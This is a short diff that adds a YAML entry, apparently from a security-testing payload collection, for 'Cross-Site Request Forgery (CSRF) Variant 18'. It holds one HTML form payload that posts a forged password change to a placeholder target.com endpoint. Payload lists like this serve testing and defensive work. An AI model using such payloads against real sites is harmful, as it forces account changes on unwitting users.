@@ -1,0 +1,5 @@
+name: Cross-Site Request Forgery (CSRF) Variant 18
+payloads:
+- <form action='http://target.com/change' method='POST'><input name='pw' value='hacked'></form>
+severity: medium
+type: csrf
